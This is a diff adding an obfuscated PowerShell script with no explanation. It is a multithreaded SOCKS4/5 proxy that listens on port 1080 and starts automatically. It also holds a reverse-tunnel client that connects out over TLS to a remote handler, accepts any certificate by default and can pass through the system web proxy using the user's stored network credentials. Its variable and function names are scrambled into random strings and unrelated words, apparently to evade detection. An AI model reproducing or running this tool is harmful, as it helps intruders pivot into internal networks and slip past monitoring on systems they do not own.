@@ -1,0 +1,316 @@
+[ScriptBlock]$KnUGidNn99 = {
+    param($vars)
+    $DMXLQCWG99 = {
+            param($vars)
+            $vars.inStream.CopyTo($vars.outStream)
+            Exit
+    }
+    $rsp=$vars.rsp;
+    function medic{
+        param($ip)
+        IF ($ip -as [ipaddress]){
+            return $ip
+        }else{
+            $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
+        }
+        return $ip2
+    }
+    $ffKTztej99=$vars.cliConnection
+    $XyEkwFSg99 = New-Object System.Byte[] 32
+    try
+    {
+        $ZrjPAZTy99 = $vars.cliStream
+        $ZrjPAZTy99.Read($XyEkwFSg99,0,2) | Out-Null
+        $MGxjityJ99=$XyEkwFSg99[0]
+        if ($MGxjityJ99 -eq 5){
+            $ZrjPAZTy99.Read($XyEkwFSg99,2,$XyEkwFSg99[1]) | Out-Null
+            for ($i=2; $i -le $XyEkwFSg99[1]+1; $i++) {
+                if ($XyEkwFSg99[$i] -eq 0) {break}
+            }
+            if ($XyEkwFSg99[$i] -ne 0){
+                $XyEkwFSg99[1]=255
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+            }else{
+                $XyEkwFSg99[1]=0
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+            }
+            $ZrjPAZTy99.Read($XyEkwFSg99,0,4) | Out-Null
+            $cmd = $XyEkwFSg99[1]
+            $atyp = $XyEkwFSg99[3]
+            if($cmd -ne 1){
+                $XyEkwFSg99[1] = 7
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+                throw "Not a connect"
+            }
+            if($atyp -eq 1){
+                $ipv4 = New-Object System.Byte[] 4
+                $ZrjPAZTy99.Read($ipv4,0,4) | Out-Null
+                $IqUGHlGA99 = New-Object System.Net.IPAddress(,$ipv4)
+                $HhScZUru99 = $IqUGHlGA99.ToString()
+            }elseif($atyp -eq 3){
+                $ZrjPAZTy99.Read($XyEkwFSg99,4,1) | Out-Null
+                $UslmcUtG99 = New-Object System.Byte[] $XyEkwFSg99[4]
+                $ZrjPAZTy99.Read($UslmcUtG99,0,$XyEkwFSg99[4]) | Out-Null
+                $HhScZUru99 = [System.Text.Encoding]::ASCII.GetString($UslmcUtG99)
+            }
+            else{
+                $XyEkwFSg99[1] = 8
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+                throw "Not a valid destination address"
+            }
+            $ZrjPAZTy99.Read($XyEkwFSg99,4,2) | Out-Null
+            $COwsROdU99 = $XyEkwFSg99[4]*256 + $XyEkwFSg99[5]
+            $wzaEFQXi99 = medic($HhScZUru99)
+            if($wzaEFQXi99 -eq $null){
+                $XyEkwFSg99[1]=4
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+                throw "Cant resolve destination address"
+            }
+            $GUchqrOl99 = New-Object System.Net.Sockets.TcpClient($wzaEFQXi99, $COwsROdU99)
+            if($GUchqrOl99.Connected){
+                $XyEkwFSg99[1]=0
+                $XyEkwFSg99[3]=1
+                $XyEkwFSg99[4]=0
+                $XyEkwFSg99[5]=0
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,10)
+                $ZrjPAZTy99.Flush()
+                $SnTaaYry99 = $GUchqrOl99.GetStream() 
+                $MtTfmGOr99 = $SnTaaYry99.CopyToAsync($ZrjPAZTy99)
+                $aHkLBWtA99 = $ZrjPAZTy99.CopyToAsync($SnTaaYry99)
+                $aHkLBWtA99.AsyncWaitHandle.WaitOne();
+                $MtTfmGOr99.AsyncWaitHandle.WaitOne();
+                
+            }
+            else{
+                $XyEkwFSg99[1]=4
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+                throw "Cant connect to host"
+            }
+       }elseif($MGxjityJ99 -eq 4){
+            $cmd = $XyEkwFSg99[1]
+            if($cmd -ne 1){
+                $XyEkwFSg99[0] = 0
+                $XyEkwFSg99[1] = 91
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,2)
+                throw "Not a connect"
+            }
+            $ZrjPAZTy99.Read($XyEkwFSg99,2,2) | Out-Null
+            $COwsROdU99 = $XyEkwFSg99[2]*256 + $XyEkwFSg99[3]
+            $ipv4 = New-Object System.Byte[] 4
+            $ZrjPAZTy99.Read($ipv4,0,4) | Out-Null
+            $wzaEFQXi99 = New-Object System.Net.IPAddress(,$ipv4)
+            $XyEkwFSg99[0]=1
+            while ($XyEkwFSg99[0] -ne 0){
+                $ZrjPAZTy99.Read($XyEkwFSg99,0,1)
+            }
+            $GUchqrOl99 = New-Object System.Net.Sockets.TcpClient($wzaEFQXi99, $COwsROdU99)
+            
+            if($GUchqrOl99.Connected){
+                $XyEkwFSg99[0]=0
+                $XyEkwFSg99[1]=90
+                $XyEkwFSg99[2]=0
+                $XyEkwFSg99[3]=0
+                $ZrjPAZTy99.Write($XyEkwFSg99,0,8)
+                $ZrjPAZTy99.Flush()
+                $SnTaaYry99 = $GUchqrOl99.GetStream() 
+                $MtTfmGOr99 = $SnTaaYry99.CopyToAsync($ZrjPAZTy99)
+                $aHkLBWtA99 = $ZrjPAZTy99.CopyTo($SnTaaYry99)
+                $aHkLBWtA99.AsyncWaitHandle.WaitOne();
+                $MtTfmGOr99.AsyncWaitHandle.WaitOne();
+            }
+       }else{
+            throw "Unknown socks version"
+       }
+    }
+    catch {
+    }
+    finally {
+        if ($ffKTztej99 -ne $null) {
+            $ffKTztej99.Dispose()
+        }
+        if ($GUchqrOl99 -ne $null) {
+            $GUchqrOl99.Dispose()
+        }
+        Exit;
+    }
+}
+ 
+function disproportions{
+    param (
+ 
+            [String]$hspHmWIB99 = "0.0.0.0",
+ 
+            [Int]$PwhwyioP99 = 1080,
+            [Int]$cEQuabcK99 = 200
+ 
+     )
+    try{
+        $mRQKYZQP99 = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($hspHmWIB99), $PwhwyioP99)
+        $mRQKYZQP99.start()
+        $rsp = [runspacefactory]::CreateRunspacePool(1,$cEQuabcK99);
+        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
+        $rsp.open();
+        write-host "Listening on port $PwhwyioP99..."
+        while($true){
+            $ffKTztej99 = $mRQKYZQP99.AcceptTcpClient()
+            $ZrjPAZTy99 = $ffKTztej99.GetStream()
+            Write-Host "New Connection from " $ffKTztej99.Client.RemoteEndPoint
+            $vars = [PSCustomObject]@{"cliConnection"=$ffKTztej99; "rsp"=$rsp; "cliStream" = $ZrjPAZTy99}
+            $PS3 = [PowerShell]::Create()
+            $PS3.RunspacePool = $rsp;
+            $PS3.AddScript($KnUGidNn99).AddArgument($vars) | Out-Null
+            $PS3.BeginInvoke() | Out-Null
+            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
+        }
+     }
+    catch{
+        throw $_
+    }
+    finally{
+        write-host "Server closed."
+        if ($mRQKYZQP99 -ne $null) {
+                  $mRQKYZQP99.Stop()
+           }
+        if ($ffKTztej99 -ne $null) {
+            $ffKTztej99.Dispose()
+            $ffKTztej99 = $null
+        }
+        if ($PS3 -ne $null -and $IsWbKurH99 -ne $null) {
+            $PS3.EndInvoke($IsWbKurH99) | Out-Null
+            $PS3.Runspace.Close()
+            $PS3.Dispose()
+        }
+    }
+}
+function reworks{
+    param (
+ 
+            [String]$JotGxIvD99,
+ 
+            [Int]$VTVuogAv99
+     )
+    $HnEwuGjJ99 = [System.Net.HttpWebRequest]::Create("http://" + $JotGxIvD99 + ":" + $VTVuogAv99 ) 
+    $HnEwuGjJ99.Method = "CONNECT";
+    $proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+    $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+    $HnEwuGjJ99.Proxy = $proxy;
+    $HnEwuGjJ99.timeout = 1000;
+    $oyfQIzXe99 = $HnEwuGjJ99.GetResponse();
+    $HnEwuGjJ99.timeout = 100000;
+    $wIfTTnod99 = $oyfQIzXe99.GetResponseStream()
+    $hcOJYqPP99= [Reflection.BindingFlags] "NonPublic,Instance"
+    $efBRAWkO99 = $wIfTTnod99.GetType()
+    $nKQIWRQK99 = $efBRAWkO99.GetProperty("Connection", $hcOJYqPP99)
+    $TGuuXcKM99 = $nKQIWRQK99.GetValue($wIfTTnod99, $null)
+    $vyflawMd99 = $TGuuXcKM99.GetType()
+    $PxqxBAyf99 = $vyflawMd99.GetProperty("NetworkStream", $hcOJYqPP99)
+    $DmMcofhT99 = $PxqxBAyf99.GetValue($TGuuXcKM99, $null)
+    return $TGuuXcKM99, $DmMcofhT99
+}
+function choppers{
+    param (
+ 
+            [String]$JotGxIvD99 = "127.0.0.1",
+ 
+            [Int]$VTVuogAv99 = 1080,
+            [Switch]$WWJnCMtv99 = $false,
+            [String]$PhcPigyu99 = "",
+            [Int]$cEQuabcK99 = 200,
+            [Int]$pzXJipiA99 = 0
+     )
+    try{
+        $NAFVSslw99 = 0;
+        $rsp = [runspacefactory]::CreateRunspacePool(1,$cEQuabcK99);
+        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
+        $rsp.open();
+        while($true){
+            Write-Host "Connecting to: " $JotGxIvD99 ":" $VTVuogAv99
+            try{
+                if($WWJnCMtv99 -eq $false){
+                        $ffKTztej99 = New-Object System.Net.Sockets.TcpClient($JotGxIvD99, $VTVuogAv99)
+                        $WuGOjBqG99 = $ffKTztej99.GetStream()
+                    }else{
+                        $ret = reworks -JotGxIvD99 $JotGxIvD99 -VTVuogAv99 $VTVuogAv99
+                        $ffKTztej99 = $ret[0]
+                        $WuGOjBqG99 = $ret[1]
+                }
+                if($PhcPigyu99 -eq ''){
+                    $ZrjPAZTy99 = New-Object System.Net.Security.SslStream($WuGOjBqG99,$false,({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
+                }else{
+                    $ZrjPAZTy99 = New-Object System.Net.Security.SslStream($WuGOjBqG99,$false,({return $args[1].GetCertHashString() -eq $PhcPigyu99 } -as[Net.Security.RemoteCertificateValidationCallback]));
+                }
+                $ZrjPAZTy99.AuthenticateAsClient($JotGxIvD99)
+                Write-Host "Connected"
+                $NAFVSslw99 = 0;
+                $XyEkwFSg99 = New-Object System.Byte[] 32
+                $cDMxaBdR99 = New-Object System.Byte[] 122
+                $swXJPGni99 = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: "+$JotGxIvD99+"`n`n")
+                $ZrjPAZTy99.Write($swXJPGni99,0,$swXJPGni99.Length)
+                $ZrjPAZTy99.ReadTimeout = 5000
+                $ZrjPAZTy99.Read($cDMxaBdR99,0,122) | Out-Null
+                $ZrjPAZTy99.Read($XyEkwFSg99,0,5) | Out-Null
+                $YamwirVV99 = [System.Text.Encoding]::ASCII.GetString($XyEkwFSg99)
+                if($YamwirVV99 -ne "HELLO"){
+                    throw "No Client connected";
+                }else{
+                    Write-Host "Connection received"
+                }
+                $ZrjPAZTy99.ReadTimeout = 100000;
+                $vars = [PSCustomObject]@{"cliConnection"=$ffKTztej99; "rsp"=$rsp; "cliStream" = $ZrjPAZTy99}
+                $PS3 = [PowerShell]::Create()
+                $PS3.RunspacePool = $rsp;
+                $PS3.AddScript($KnUGidNn99).AddArgument($vars) | Out-Null
+                $PS3.BeginInvoke() | Out-Null
+                Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
+            }catch{
+                $NAFVSslw99 = $NAFVSslw99 + 1;
+                if (($pzXJipiA99 -ne 0) -and ($NAFVSslw99 -eq $pzXJipiA99)){
+                    Throw "Cannot connect to handler, max Number of attempts reached, exiting";
+                }
+                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "The remote certificate is invalid according to the validation procedure."'){
+                    throw $_
+                }
+                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "Authentication failed because the remote party has closed the transport stream."'){
+                    sleep 5
+                }
+                if (($_.Exception.Message.Length -ge 121) -and $_.Exception.Message.substring(0,120) -eq 'Exception calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively refused'){
+                    sleep 5
+                }
+                try{
+                    $ffKTztej99.Close()
+                    $ffKTztej99.Dispose()
+                }catch{}
+                    sleep -Milliseconds 200
+                }
+        }
+     }
+    catch{
+        throw $_;
+    }
+    finally{
+        write-host "Server closed."
+        if ($ffKTztej99 -ne $null) {
+            $ffKTztej99.Dispose()
+            $ffKTztej99 = $null
+        }
+        if ($PS3 -ne $null -and $IsWbKurH99 -ne $null) {
+            $PS3.EndInvoke($IsWbKurH99) | Out-Null
+            $PS3.Runspace.Close()
+            $PS3.Dispose()
+        }
+    }
+}
+ 
+function medic{
+    param($ip)
+    IF ($ip -as [ipaddress]){
+        return $ip
+    }else{
+        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
+        Write-Host "$ip resolved to $ip2"
+    }
+    return $ip2
+}
+#export-modulemember -function disproportions
+#export-modulemember -function choppers
+disproportions -PwhwyioP99 1080
